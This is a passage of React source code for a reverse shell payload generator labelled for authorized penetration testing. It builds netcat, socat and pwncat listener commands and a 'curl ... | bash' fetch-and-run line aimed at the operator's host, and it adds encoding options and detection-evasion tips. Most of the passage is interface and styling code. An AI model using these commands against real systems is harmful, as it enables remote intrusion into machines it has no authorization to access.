      return `socat -d -d TCP-LISTEN:${port},reuseaddr FILE:\`tty\`,raw,echo=0`;
    case "socat-tls":
      return `# Generate cert first:\nopenssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt\n# Then listen:\nsocat OPENSSL-LISTEN:${port},cert=server.crt,key=server.key,verify=0 FILE:\`tty\`,raw,echo=0`;
    case "pwncat":
      return `pwncat-cs -lp ${port}`;
    default:
      return `nc -lvnp ${port}`;
  }
}

function highlightPayload(payload: string, accent: string): string {
  const ips = payload.replace(
    /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g,
    `<span style="color:${accent};font-weight:bold">$1</span>`,
  );
  return ips.replace(/\b(\d{2,5})\b/g, (m, n) => {
    if (parseInt(n) >= 1 && parseInt(n) <= 65535)
      return `<span style="color:#ff9f43;font-weight:bold">${n}</span>`;
    return m;
  });
}

function hexToRgb(hex: string): string {
  const clean = hex.replace("#", "");
  const r = parseInt(clean.substring(0, 2), 16);
  const g = parseInt(clean.substring(2, 4), 16);
  const b = parseInt(clean.substring(4, 6), 16);
  return `${r},${g},${b}`;
}

const CATEGORY_ICONS: Record<string, string> = {
  Bash: "bash",
  Python: "py",
  PHP: "php",
  Netcat: "nc",
  PowerShell: "PS>",
  Ruby: "rb",
  Perl: "pl",
  Java: "jv",
  Go: "go",
  "Node.js": "js",
  Socat: "sc",
  Awk: "awk",
  Lua: "lua",
  OpenSSL: "ssl",
  Telnet: "tel",
  Download: "dl",
  JVM: "jvm",
  R: "R",
  Zsh: "zsh",
  Kotlin: "kt",
  Scala: "sc",
  Crystal: "cr",
  Dart: "dt",
  V: "v",
  Windows: "cmd",
  Haskell: "hs",
  Tcl: "tcl",
};

const NOISE_CONFIG = {
  low: {
    color: "#00ff41",
    label: "LOW NOISE",
    desc: "Quieter — less likely to trigger alerts",
  },
  medium: {
    color: "#ffb300",
    label: "MEDIUM",
    desc: "Moderate detection risk",
  },
  high: {
    color: "#ff3131",
    label: "HIGH NOISE",
    desc: "Easily detected by EDR/SIEM",
  },
};

export default function DrewsRevShell(): React.ReactElement {
  const [ip, setIp] = useState<string>("10.10.10.10");
  const [port, setPort] = useState<string>("4444");
  const [selectedShell, setSelectedShell] = useState<Shell>(SHELLS[0]);
  const [encoding, setEncoding] = useState<EncodingKey>("none");
  const [theme, setTheme] = useState<ThemeKey>("green");
  const [copied, setCopied] = useState<boolean>(false);
  const [copiedListener, setCopiedListener] = useState<boolean>(false);
  const [copiedCmd, setCopiedCmd] = useState<string>("");
  const [showExplain, setShowExplain] = useState<boolean>(false);
  const [showOpsec, setShowOpsec] = useState<boolean>(true);
  const [listenerType, setListenerType] = useState<ListenerType>("nc");
  const [search, setSearch] = useState<string>("");
  const [favorites, setFavorites] = useState<Set<string>>(
    new Set(["bash-tcp", "python3", "nc-openbsd"]),
  );
  const [history, setHistory] = useState<HistoryEntry[]>([]);
  const [showHistory, setShowHistory] = useState<boolean>(false);
  const [activeTab, setActiveTab] = useState<TabKey>("payload");
  const [autoIpLoading, setAutoIpLoading] = useState<boolean>(false);
  const [prevPayload, setPrevPayload] = useState<string>("");
  const [ttyStep, setTtyStep] = useState<number>(0);

  const t: Theme = THEMES[theme];
  const payload: string = selectedShell.generate(ip || "IP", port || "PORT");
  const encodedPayload: string = encodePayload(payload, encoding);
  const listenerCmd: string = getListener(port || "PORT", listenerType);

  const ipError: string = useMemo(() => {
    if (!ip) return "";
    const v4 = /^(\d{1,3}\.){3}\d{1,3}$/;
    const v6 = /^[0-9a-fA-F:]+$/;
    const hostname = /^[a-zA-Z0-9.-]+$/;
    if (!v4.test(ip) && !v6.test(ip) && !hostname.test(ip))
      return "Invalid IP/hostname";
    return "";
  }, [ip]);

  const portError: string = useMemo(() => {
    if (!port) return "";
    const n = parseInt(port, 10);
    if (isNaN(n) || n < 1 || n > 65535) return "Port: 1–65535";
    return "";
  }, [port]);

  useEffect(() => {
    if (!ip || !port || ipError || portError) return;
    const entry: HistoryEntry = {
      payload: encodedPayload,
      shell: selectedShell.label,
      ts: Date.now(),
    };
    const id = setTimeout(() => {
      setHistory((h) => {
        const filtered = h.filter((x) => x.payload !== entry.payload);
        return [entry, ...filtered].slice(0, 10);
      });
    }, 0);
    return () => clearTimeout(id);
  }, [encodedPayload]);

  const copyPayload = useCallback(() => {
    navigator.clipboard.writeText(encodedPayload).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    });
  }, [encodedPayload]);

  const copyListener = useCallback(() => {
    navigator.clipboard.writeText(listenerCmd).then(() => {
      setCopiedListener(true);
      setTimeout(() => setCopiedListener(false), 1500);
    });
  }, [listenerCmd]);

  const copyCmd = useCallback((cmd: string, id: string) => {
    navigator.clipboard.writeText(cmd).then(() => {
      setCopiedCmd(id);
      setTimeout(() => setCopiedCmd(""), 1500);
    });
  }, []);

  const fetchPublicIp = async (): Promise<void> => {
    setAutoIpLoading(true);
    try {
      const r = await fetch("https://api.ipify.org?format=json");
      const d = (await r.json()) as { ip: string };
      setIp(d.ip);
    } catch {
      setIp("Could not fetch");
    }
    setAutoIpLoading(false);
  };

  const toggleFavorite = (id: string): void => {
    setFavorites((f) => {
      const n = new Set(f);
      n.has(id) ? n.delete(id) : n.add(id);
      return n;
    });
  };

  const downloadPayload = (): void => {
    const blob = new Blob([encodedPayload], { type: "text/plain" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `revshell.${selectedShell.ext}`;
    a.click();
  };

  const categories: string[] = [...new Set(SHELLS.map((s) => s.category))];
  const filteredShells: Shell[] = SHELLS.filter(
    (s) =>
      s.label.toLowerCase().includes(search.toLowerCase()) ||
      s.category.toLowerCase().includes(search.toLowerCase()),
  );

  useEffect(() => {
    const handler = (e: KeyboardEvent): void => {
      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") {
        e.preventDefault();
        copyPayload();
      }
      if ((e.ctrlKey || e.metaKey) && e.key === "k") {
        e.preventDefault();
        setSearch("");
      }
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, [copyPayload]);

  const favShells: Shell[] = SHELLS.filter((s) => favorites.has(s.id));

  const encodingOptions: [EncodingKey, string][] = [
    ["none", "raw"],
    ["base64", "b64"],
    ["url", "url"],
    ["double-url", "2url"],
    ["hex", "hex"],
  ];

  const noiseInfo = selectedShell.noise
    ? NOISE_CONFIG[selectedShell.noise]
    : null;

  const css = `
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Share+Tech+Mono&display=swap');
    * { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --accent: ${t.accent}; --dim: ${t.dim}; --bg: ${t.bg}; --panel: ${t.panel};
      --border: ${t.border}; --text: ${t.text}; --muted: ${t.muted};
    }
    body { background: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; }
    ::-webkit-scrollbar { width: 4px; height: 4px; }
    ::-webkit-scrollbar-track { background: var(--bg); }
    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
    @keyframes scanline { 0% { transform: translateY(-100%); } 100% { transform: translateY(100vh); } }
    @keyframes flicker { 0%,100% { opacity:1; } 92% { opacity:1; } 93% { opacity:0.8; } 94% { opacity:1; } 96% { opacity:0.9; } }
    @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0; } }
    @keyframes fadeIn { from { opacity:0; transform:translateY(4px); } to { opacity:1; transform:translateY(0); } }
    @keyframes pulse { 0%,100% { box-shadow: 0 0 5px var(--accent); } 50% { box-shadow: 0 0 20px var(--accent); } }
    @keyframes slideIn { from { opacity:0; transform:translateX(-8px); } to { opacity:1; transform:translateX(0); } }
    .scanline { position:fixed; top:0; left:0; right:0; height:2px; background: linear-gradient(transparent, rgba(${hexToRgb(t.accent)},0.08), transparent); animation: scanline 8s linear infinite; pointer-events:none; z-index:9999; }
    .crt-overlay { position:fixed; inset:0; pointer-events:none; z-index:9998; background: repeating-linear-gradient(0deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 1px, transparent 1px, transparent 2px); animation: flicker 6s infinite; }
    .app { display:flex; flex-direction:column; min-height:100vh; animation: fadeIn 0.4s ease; }
    .header { border-bottom: 1px solid var(--border); padding: 10px 20px; display:flex; align-items:center; justify-content:space-between; background: var(--panel); position:sticky; top:0; z-index:100; }
    .logo { display:flex; align-items:center; gap:12px; }
    .logo-icon { width:34px; height:34px; border:1px solid var(--accent); display:flex; align-items:center; justify-content:center; font-size:10px; color:var(--accent); font-weight:700; box-shadow: 0 0 10px var(--dim), inset 0 0 10px rgba(0,0,0,0.5); animation: pulse 3s ease-in-out infinite; }
    .logo-text { font-family:'Share Tech Mono',monospace; font-size:17px; color:var(--accent); letter-spacing:3px; text-shadow: 0 0 15px var(--dim); }
    .logo-sub { font-size:9px; color:var(--muted); letter-spacing:2px; margin-top:2px; }
    .header-right { display:flex; gap:16px; align-items:center; }
    .auth-banner { padding:4px 12px; border:1px solid var(--dim); font-size:9px; color:var(--dim); letter-spacing:1px; }
    .theme-btns { display:flex; gap:6px; }
    .theme-btn { width:16px; height:16px; border-radius:50%; cursor:pointer; border:2px solid transparent; transition:all 0.2s; }
    .theme-btn.active { border-color: #ffffff88; transform:scale(1.2); }
    .main { display:flex; flex:1; gap:0; }
    .sidebar { width:210px; min-width:210px; border-right:1px solid var(--border); background:var(--panel); display:flex; flex-direction:column; height:calc(100vh - 55px); position:sticky; top:55px; overflow:hidden; }
    .sidebar-search { padding:8px 10px; border-bottom:1px solid var(--border); }
    .search-input { width:100%; background:var(--bg); border:1px solid var(--border); color:var(--text); padding:6px 10px; font-family:'JetBrains Mono',monospace; font-size:11px; outline:none; transition:border 0.2s; }
    .search-input:focus { border-color:var(--accent); }
    .shell-list { overflow-y:auto; flex:1; }
    .shell-category { padding:8px 10px 4px; font-size:9px; color:var(--muted); letter-spacing:2px; text-transform:uppercase; }
    .shell-item { display:flex; align-items:center; gap:8px; padding:6px 10px; cursor:pointer; transition:all 0.15s; border-left:2px solid transparent; font-size:11px; }
    .shell-item:hover { background:rgba(255,255,255,0.03); border-left-color:var(--dim); }
    .shell-item.active { background:rgba(255,255,255,0.06); border-left-color:var(--accent); color:var(--accent); animation: slideIn 0.15s ease; }
    .shell-icon { width:26px; height:18px; background:var(--bg); border:1px solid var(--border); display:flex; align-items:center; justify-content:center; font-size:7px; color:var(--muted); flex-shrink:0; font-weight:700; }
    .shell-item.active .shell-icon { border-color:var(--accent); color:var(--accent); }
    .shell-noise { width:6px; height:6px; border-radius:50%; flex-shrink:0; margin-left:auto; }
    .star-btn { background:none; border:none; cursor:pointer; color:var(--muted); font-size:11px; padding:0 2px; flex-shrink:0; }
    .star-btn.active { color:#ffd700; }
    .content { flex:1; display:flex; flex-direction:column; overflow:hidden; }
    .config-bar { padding:12px 18px; border-bottom:1px solid var(--border); background:var(--panel); display:flex; flex-wrap:wrap; gap:12px; align-items:flex-end; }
    .field { display:flex; flex-direction:column; gap:4px; }
    .field-label { font-size:9px; color:var(--muted); letter-spacing:2px; text-transform:uppercase; }
    .field-input { background:var(--bg); border:1px solid var(--border); color:var(--text); padding:6px 10px; font-family:'JetBrains Mono',monospace; font-size:13px; outline:none; transition:all 0.2s; width:180px; }
    .field-input:focus { border-color:var(--accent); box-shadow:0 0 8px var(--dim); }
    .field-input.error { border-color:#ff4444; }
    .error-msg { font-size:9px; color:#ff4444; margin-top:2px; }
    .port-quick { display:flex; gap:4px; flex-wrap:wrap; margin-top:4px; }
    .port-chip { padding:2px 6px; background:var(--bg); border:1px solid var(--border); font-size:10px; cursor:pointer; color:var(--muted); transition:all 0.15s; font-family:'JetBrains Mono',monospace; }
    .port-chip:hover, .port-chip.active { border-color:var(--accent); color:var(--accent); }
    .ip-row { display:flex; gap:6px; align-items:flex-end; }
    .auto-btn { padding:6px 10px; background:var(--bg); border:1px solid var(--border); color:var(--muted); font-size:10px; cursor:pointer; transition:all 0.2s; font-family:'JetBrains Mono',monospace; white-space:nowrap; }
    .auto-btn:hover { border-color:var(--accent); color:var(--accent); }
    .tabs { display:flex; border-bottom:1px solid var(--border); background:var(--panel); }
    .tab { padding:9px 16px; font-size:11px; cursor:pointer; color:var(--muted); border-bottom:2px solid transparent; transition:all 0.2s; letter-spacing:1px; }
    .tab:hover { color:var(--text); }
    .tab.active { color:var(--accent); border-bottom-color:var(--accent); }
    .output-area { flex:1; padding:16px; overflow:auto; display:flex; flex-direction:column; gap:14px; }
    .output-card { background:var(--panel); border:1px solid var(--border); animation: fadeIn 0.2s ease; }
    .card-header { display:flex; align-items:center; justify-content:space-between; padding:8px 14px; border-bottom:1px solid var(--border); background:rgba(0,0,0,0.2); }
    .card-title { font-size:10px; color:var(--muted); letter-spacing:2px; text-transform:uppercase; }
    .card-actions { display:flex; gap:6px; }
    .action-btn { padding:4px 10px; font-size:10px; background:var(--bg); border:1px solid var(--border); color:var(--muted); cursor:pointer; transition:all 0.2s; font-family:'JetBrains Mono',monospace; }
    .action-btn:hover { border-color:var(--accent); color:var(--accent); }
    .action-btn.success { border-color:#00ff41; color:#00ff41; }
    .action-btn.primary { border-color:var(--accent); color:var(--accent); }
    .payload-box { padding:14px 16px; font-size:12px; line-height:1.8; word-break:break-all; position:relative; min-height:56px; }
    .cursor { display:inline-block; width:8px; height:14px; background:var(--accent); margin-left:2px; animation:blink 1s step-end infinite; vertical-align:text-bottom; }
    .explain-section { padding:10px 14px; border-top:1px solid var(--border); background:rgba(0,0,0,0.2); }
    .explain-row { display:flex; gap:12px; margin-bottom:5px; font-size:11px; }
    .explain-key { color:var(--accent); min-width:180px; flex-shrink:0; }
    .explain-val { color:var(--muted); }
    .opsec-section { padding:10px 14px; border-top:1px solid var(--border); background:rgba(255,180,0,0.04); display:flex; gap:10px; align-items:flex-start; }
    .opsec-icon { font-size:14px; flex-shrink:0; margin-top:1px; }
    .opsec-text { font-size:11px; color:#cc9900; line-height:1.6; }
    .mitre-section { padding:8px 14px; border-top:1px solid var(--border); background:rgba(0,0,0,0.15); display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
    .mitre-label { font-size:9px; color:var(--muted); letter-spacing:1px; }
    .mitre-tag { padding:2px 8px; border:1px solid rgba(100,100,255,0.4); background:rgba(100,100,255,0.07); color:#8888ff; font-size:10px; cursor:pointer; transition:all 0.15s; }
    .mitre-tag:hover { border-color:#8888ff; background:rgba(100,100,255,0.15); }
    .noise-badge { display:flex; align-items:center; gap:6px; padding:2px 8px; border:1px solid; font-size:9px; letter-spacing:1px; }
    .enc-chip { padding:4px 10px; background:var(--bg); border:1px solid var(--border); font-size:10px; cursor:pointer; color:var(--muted); transition:all 0.15s; font-family:'JetBrains Mono',monospace; }
    .enc-chip:hover { border-color:var(--dim); color:var(--text); }
    .enc-chip.active { border-color:var(--accent); color:var(--accent); background:rgba(255,255,255,0.03); }
    .encoding-row { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
    .length-badge { font-size:9px; color:var(--muted); padding:2px 6px; background:var(--bg); border:1px solid var(--border); }
    .encrypted-badge { font-size:9px; color:#00ff41; padding:2px 6px; background:rgba(0,255,65,0.05); border:1px solid rgba(0,255,65,0.3); }
    .listener-select { padding:4px 8px; background:var(--bg); border:1px solid var(--border); color:var(--text); font-family:'JetBrains Mono',monospace; font-size:11px; outline:none; cursor:pointer; }
    .history-list { padding:10px; display:flex; flex-direction:column; gap:6px; }
    .history-item { padding:8px 12px; background:var(--bg); border:1px solid var(--border); cursor:pointer; transition:all 0.15s; font-size:11px; }
    .history-item:hover { border-color:var(--accent); }
    .history-meta { display:flex; gap:12px; color:var(--muted); font-size:9px; margin-top:4px; }
    .history-payload { color:var(--text); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
    .favorites-section { padding:6px 0; border-bottom:1px solid var(--border); }
    .fav-label { padding:4px 10px 2px; font-size:9px; color:var(--muted); letter-spacing:2px; text-transform:uppercase; }
    .empty-state { padding:20px; text-align:center; color:var(--muted); font-size:11px; }
    .kbd { display:inline-block; padding:1px 5px; background:var(--bg); border:1px solid var(--border); font-size:9px; color:var(--muted); }
    .tty-wizard { display:flex; flex-direction:column; gap:0; }
    .tty-step { border-bottom:1px solid var(--border); }
    .tty-step-header { display:flex; align-items:center; gap:10px; padding:10px 14px; cursor:pointer; transition:background 0.15s; }
    .tty-step-header:hover { background:rgba(255,255,255,0.02); }
    .tty-step-num { width:24px; height:24px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; font-size:10px; color:var(--muted); flex-shrink:0; }
    .tty-step-num.active { border-color:var(--accent); color:var(--accent); box-shadow:0 0 6px var(--dim); }
    .tty-step-num.done { border-color:#00ff41; color:#00ff41; background:rgba(0,255,65,0.05); }
    .tty-step-title { font-size:12px; }
    .tty-step-content { padding:0 14px 12px 48px; animation: fadeIn 0.2s ease; }
    .tty-step-desc { font-size:11px; color:var(--muted); margin-bottom:8px; line-height:1.6; }
    .tty-cmd-row { display:flex; align-items:center; gap:8px; margin-bottom:6px; }
    .tty-cmd { font-size:11px; padding:6px 10px; background:var(--bg); border:1px solid var(--border); flex:1; color:var(--text); font-family:'JetBrains Mono',monospace; line-height:1.4; }
    .tty-cmd.preferred { border-color:var(--dim); color:var(--accent); }
    .tty-cmd-label { font-size:9px; color:var(--muted); min-width:120px; text-align:right; flex-shrink:0; }
    .tty-preferred-badge { font-size:8px; color:var(--accent); padding:1px 5px; border:1px solid var(--dim); margin-left:4px; }
    .tty-copy-btn { padding:4px 8px; background:var(--bg); border:1px solid var(--border); color:var(--muted); cursor:pointer; font-size:9px; font-family:'JetBrains Mono',monospace; transition:all 0.15s; white-space:nowrap; flex-shrink:0; }
    .tty-copy-btn:hover { border-color:var(--accent); color:var(--accent); }
    .tty-copy-btn.done { border-color:#00ff41; color:#00ff41; }
    .tty-nav { display:flex; gap:8px; padding:10px 14px 14px 48px; }
    .tty-nav-btn { padding:5px 14px; background:var(--bg); border:1px solid var(--border); color:var(--muted); cursor:pointer; font-size:10px; font-family:'JetBrains Mono',monospace; transition:all 0.15s; }
    .tty-nav-btn:hover { border-color:var(--accent); color:var(--accent); }
    .tty-nav-btn.primary { border-color:var(--accent); color:var(--accent); }
    .tty-progress { display:flex; gap:4px; padding:10px 14px; border-bottom:1px solid var(--border); background:rgba(0,0,0,0.2); }
    .tty-progress-step { height:3px; flex:1; background:var(--border); transition:background 0.3s; }
    .tty-progress-step.done { background:var(--accent); }
    .tty-intro { padding:14px; border-bottom:1px solid var(--border); background:rgba(0,255,65,0.03); font-size:11px; color:var(--muted); line-height:1.7; }
    .tty-intro strong { color:var(--text); }
    .footer { padding:8px 20px; border-top:1px solid var(--border); background:var(--panel); display:flex; justify-content:space-between; align-items:center; }
    .footer-text { font-size:9px; color:var(--muted); letter-spacing:1px; }
    .status-dot { width:6px; height:6px; border-radius:50%; background:var(--accent); display:inline-block; box-shadow:0 0 6px var(--accent); animation:pulse 2s infinite; margin-right:6px; }
    .select-field { background:var(--bg); border:1px solid var(--border); color:var(--text); padding:6px 10px; font-family:'JetBrains Mono',monospace; font-size:12px; outline:none; cursor:pointer; }
    .select-field:focus { border-color:var(--accent); }
  `;

  return (
    <div className="app" style={{ fontFamily: "'JetBrains Mono', monospace" }}>
      <style>{css}</style>
      <div className="scanline" />
      <div className="crt-overlay" />

      {/* Header */}
      <header className="header">
        <div className="logo">
          <div className="logo-icon">&gt;_</div>
          <div>
            <div className="logo-text">DREW&apos;S REVSHELL</div>
            <div className="logo-sub">
              PAYLOAD GENERATOR v2.1 · AUTHORIZED TESTING ONLY
            </div>
          </div>
        </div>
        <div className="header-right">
          <div className="auth-banner">⚠ FOR AUTHORIZED ENGAGEMENTS ONLY</div>
          <span style={{ fontSize: "10px", color: t.muted }}>
            <span className="kbd">Ctrl+Enter</span> copy &nbsp;{" "}
            <span className="kbd">Ctrl+K</span> search
          </span>
          <div className="theme-btns">
            {(Object.entries(THEMES) as [ThemeKey, Theme][]).map(([k, v]) => (
              <div
                key={k}
                className={`theme-btn ${theme === k ? "active" : ""}`}
                style={{ background: v.accent }}
                onClick={() => setTheme(k as ThemeKey)}
                title={v.name}
              />
            ))}
          </div>
        </div>
      </header>

      <div className="main">
        {/* Sidebar */}
        <aside className="sidebar">
          <div className="sidebar-search">
            <input
              className="search-input"
              placeholder="/ search shells..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              spellCheck={false}
            />
          </div>

          {favShells.length > 0 && !search && (
            <div className="favorites-section">
              <div className="fav-label">★ Favorites</div>
              {favShells.map((s) => (
                <div
                  key={s.id}
                  className={`shell-item ${selectedShell.id === s.id ? "active" : ""}`}
                  onClick={() => {
                    setPrevPayload(payload);
                    setSelectedShell(s);
                  }}
                >
                  <div className="shell-icon">
                    {CATEGORY_ICONS[s.category] ?? s.category.slice(0, 3)}
                  </div>
                  <span>{s.label}</span>
                  {s.noise && (
                    <div
                      className="shell-noise"
                      style={{
                        background: NOISE_CONFIG[s.noise].color,
                        boxShadow: `0 0 4px ${NOISE_CONFIG[s.noise].color}`,
                      }}
                      title={NOISE_CONFIG[s.noise].desc}
                    />
                  )}
                  <button
                    className="star-btn active"
                    onClick={(e) => {
                      e.stopPropagation();
                      toggleFavorite(s.id);
                    }}
                  >
                    ★
                  </button>
                </div>
              ))}
            </div>
          )}

          <div className="shell-list">
            {categories.map((cat) => {
              const shells = filteredShells.filter((s) => s.category === cat);
              if (!shells.length) return null;
              return (
                <div key={cat}>
                  <div className="shell-category">{cat}</div>
                  {shells.map((s) => (
                    <div
                      key={s.id}
                      className={`shell-item ${selectedShell.id === s.id ? "active" : ""}`}
                      onClick={() => {
                        setPrevPayload(payload);
                        setSelectedShell(s);
                      }}
                    >
                      <div className="shell-icon">
                        {CATEGORY_ICONS[s.category] ?? s.category.slice(0, 3)}
                      </div>
                      <span style={{ flex: 1 }}>{s.label}</span>
                      {s.noise && (
                        <div
                          className="shell-noise"
                          style={{ background: NOISE_CONFIG[s.noise].color }}
                          title={NOISE_CONFIG[s.noise].desc}
                        />
                      )}
                      <button
                        className={`star-btn ${favorites.has(s.id) ? "active" : ""}`}
                        onClick={(e) => {
                          e.stopPropagation();
                          toggleFavorite(s.id);
                        }}
                      >
                        {favorites.has(s.id) ? "★" : "☆"}
                      </button>
                    </div>
                  ))}
                </div>
              );
            })}
            {filteredShells.length === 0 && (
              <div className="empty-state">no shells found</div>
            )}
          </div>
        </aside>

        {/* Main Content */}
        <div className="content">
          {/* Config Bar */}
          <div className="config-bar">
            <div className="field">
              <div className="field-label">LHOST</div>
              <div className="ip-row">
                <input
                  className={`field-input ${ipError ? "error" : ""}`}
                  value={ip}
                  onChange={(e) => setIp(e.target.value)}
                  placeholder="10.10.10.10"
                  spellCheck={false}
                />
                <button
                  className="auto-btn"
                  onClick={fetchPublicIp}
                  disabled={autoIpLoading}
                >
                  {autoIpLoading ? "..." : "auto"}
                </button>
              </div>
              {ipError && <div className="error-msg">{ipError}</div>}
            </div>

            <div className="field">
              <div className="field-label">LPORT</div>
              <input
                className={`field-input ${portError ? "error" : ""}`}
                value={port}
                onChange={(e) => setPort(e.target.value)}
                placeholder="4444"
                style={{ width: "100px" }}
              />
              <div className="port-quick">
                {COMMON_PORTS.map((p) => (
                  <div
                    key={p}
                    className={`port-chip ${port === String(p) ? "active" : ""}`}
                    onClick={() => setPort(String(p))}
                    title={
                      p === 443
                        ? "Likely allowed outbound"
                        : p === 80
                          ? "Likely allowed outbound"
                          : p === 4444
                            ? "Common — flagged by IDS"
                            : ""
                    }
                  >
                    {p}
                  </div>
                ))}
              </div>
              {portError && <div className="error-msg">{portError}</div>}
            </div>

            <div className="field">
              <div className="field-label">ENCODING</div>
              <div className="encoding-row">
                {encodingOptions.map(([val, lbl]) => (
                  <div
                    key={val}
                    className={`enc-chip ${encoding === val ? "active" : ""}`}
                    onClick={() => setEncoding(val)}
                  >
                    {lbl}
                  </div>
                ))}
              </div>
            </div>

            <div className="field">
              <div className="field-label">OPTIONS</div>
              <div style={{ display: "flex", gap: "6px", marginTop: "4px" }}>
                <div
                  className={`enc-chip ${showExplain ? "active" : ""}`}
                  onClick={() => setShowExplain((v) => !v)}
                >
                  explain
                </div>
                <div
                  className={`enc-chip ${showOpsec ? "active" : ""}`}
                  onClick={() => setShowOpsec((v) => !v)}
                >
                  opsec
                </div>
                <div
                  className={`enc-chip ${showHistory ? "active" : ""}`}
                  onClick={() => setShowHistory((v) => !v)}
                >
                  history
                </div>
              </div>
            </div>
          </div>

          {/* Tabs */}
          <div className="tabs">
            <div
              className={`tab ${activeTab === "payload" ? "active" : ""}`}
              onClick={() => setActiveTab("payload")}
            >
              PAYLOAD
            </div>
            <div
              className={`tab ${activeTab === "listener" ? "active" : ""}`}
              onClick={() => setActiveTab("listener")}
            >
              LISTENER
            </div>
            <div
              className={`tab ${activeTab === "tty" ? "active" : ""}`}
              onClick={() => setActiveTab("tty")}
            >
              TTY UPGRADE
            </div>
            {showHistory && (
              <div
                className={`tab ${activeTab === "history" ? "active" : ""}`}
                onClick={() => setActiveTab("history")}
              >
                HISTORY
              </div>
            )}
          </div>

          <div className="output-area">
            {/* PAYLOAD TAB */}
            {activeTab === "payload" && (
              <>
                <div className="output-card">
                  <div className="card-header">
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "10px",
                      }}
                    >
                      <span className="card-title">{selectedShell.label}</span>
                      <span className="length-badge">
                        {encodedPayload.length} chars
                      </span>
                      {encoding !== "none" && (
                        <span
                          className="length-badge"
                          style={{ color: t.accent }}
                        >
                          encoded: {encoding}
                        </span>
                      )}
                      {selectedShell.encrypted && (
                        <span className="encrypted-badge">🔒 ENCRYPTED</span>
                      )}
                      {noiseInfo && (
                        <span
                          className="noise-badge"
                          style={{
                            color: noiseInfo.color,
                            borderColor: noiseInfo.color + "66",
                            background: noiseInfo.color + "0d",
                          }}
                        >
                          ◉ {noiseInfo.label}
                        </span>
                      )}
                    </div>
                    <div className="card-actions">
                      <button className="action-btn" onClick={downloadPayload}>
                        ↓ .{selectedShell.ext}
                      </button>
                      <button
                        className={`action-btn ${copied ? "success" : "primary"}`}
                        onClick={copyPayload}
                      >
                        {copied ? "✓ copied!" : "copy"}
                      </button>
                    </div>
                  </div>

                  <div className="payload-box">
                    <span
                      dangerouslySetInnerHTML={{
                        __html: highlightPayload(encodedPayload, t.accent),
                      }}
                    />
                    <span className="cursor" />
                  </div>

                  {/* MITRE tags */}
                  {selectedShell.mitre && selectedShell.mitre.length > 0 && (
                    <div className="mitre-section">
                      <span className="mitre-label">MITRE ATT&CK</span>
                      {selectedShell.mitre.map((tag) => (
                        <a
                          key={tag}
                          className="mitre-tag"
                          href={`https://attack.mitre.org/techniques/${tag.replace(".", "/")}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          title="View on MITRE ATT&CK"
                        >
                          {tag} ↗
                        </a>
                      ))}
                    </div>
                  )}

                  {/* OPSEC Note */}
                  {showOpsec && selectedShell.opsec && (
                    <div className="opsec-section">
                      <span className="opsec-icon">⚠</span>
                      <div className="opsec-text">
                        <strong style={{ color: "#ffb300" }}>OPSEC: </strong>
                        {selectedShell.opsec}
                      </div>
                    </div>
                  )}

                  {/* Explain */}
                  {showExplain &&
                    Object.keys(selectedShell.explain || {}).length > 0 && (
                      <div className="explain-section">
                        {Object.entries(selectedShell.explain).map(([k, v]) => (
                          <div key={k} className="explain-row">
                            <span className="explain-key">{k}</span>
                            <span className="explain-val">
                              {"// "}
                              {v}
                            </span>
                          </div>
                        ))}
                      </div>
                    )}
                </div>

                {/* Curl wrap card */}
                <div className="output-card">
                  <div className="card-header">
                    <span className="card-title">CURL WRAP · T1105</span>
                    <button
                      className="action-btn"
                      onClick={() =>
                        navigator.clipboard.writeText(
                          `curl -s http://${ip}:${port}/ | ${selectedShell.ext === "sh" ? "bash" : selectedShell.ext}`,
                        )
                      }
                    >
                      copy
                    </button>
                  </div>
                  <div
                    className="payload-box"
                    style={{ fontSize: "11px", color: t.muted }}
                  >
                    <span style={{ color: t.accent }}>curl</span> -s http://{ip}
                    :{port}/ |{" "}
                    {selectedShell.ext === "sh" ? "bash" : selectedShell.ext}
                  </div>
                </div>
              </>
            )}

            {/* LISTENER TAB */}
            {activeTab === "listener" && (
              <div className="output-card">
                <div className="card-header">
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: "10px",
                    }}
                  >
                    <span className="card-title">LISTENER COMMAND</span>
                    <select
                      className="listener-select"
                      value={listenerType}
                      onChange={(e) =>
                        setListenerType(e.target.value as ListenerType)
                      }
                    >
                      <option value="nc">netcat</option>
                      <option value="ncat">ncat</option>
                      <option value="socat">socat basic</option>
                      <option value="socat-pty">socat PTY (full TTY)</option>
                      <option value="socat-tls">socat TLS (encrypted)</option>
                      <option value="pwncat">pwncat-cs</option>
                    </select>
                  </div>
                  <button
                    className={`action-btn ${copiedListener ? "success" : "primary"}`}
                    onClick={copyListener}
                  >
                    {copiedListener ? "✓ copied!" : "copy"}
                  </button>
                </div>
                <div className="payload-box" style={{ whiteSpace: "pre-wrap" }}>
                  <span
                    dangerouslySetInnerHTML={{
                      __html: highlightPayload(listenerCmd, t.accent),
                    }}
                  />
                  <span className="cursor" />
                </div>
                <div className="explain-section">
                  <div
                    style={{
                      fontSize: "10px",
                      color: t.muted,
                      lineHeight: "1.8",
                    }}
                  >
                    Run this on your machine{" "}
                    <strong style={{ color: t.text }}>before</strong> executing
                    the payload on target.
                    <br />
                    For socat-pty or pwncat, no TTY upgrade needed — shell is
                    fully interactive immediately.
                    <br />
                    For nc/ncat listeners, use the{" "}
                    <span
                      style={{ color: t.accent, cursor: "pointer" }}
                      onClick={() => setActiveTab("tty")}
                    >
